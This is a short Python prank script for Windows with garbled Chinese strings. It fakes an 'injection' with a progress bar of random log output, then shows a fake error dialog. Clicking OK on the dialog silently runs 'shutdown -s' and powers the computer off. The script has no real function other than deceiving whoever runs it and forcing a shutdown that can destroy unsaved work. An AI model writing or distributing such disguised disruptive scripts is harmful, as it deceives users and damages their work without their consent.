# coding=gb2312
from tqdm import tqdm
from loguru import logger
import pygame,os,time,random
import win32api,win32con
def lzh_lib():
    logger.debug("����ע�뼫����ӽ���")
    for i in tqdm(range(1, 100)):
        logger.debug(str(random.random()))
        time.sleep(0.05)
    a = win32api.MessageBox(0,"ע��ʧ��","������ӽ���רɱ����-ע��ʧ��",win32con.MB_ICONERROR)
    if str(a) == "1":
        os.system("shutdown -s")
    else:
        exit()
        
lzh_lib()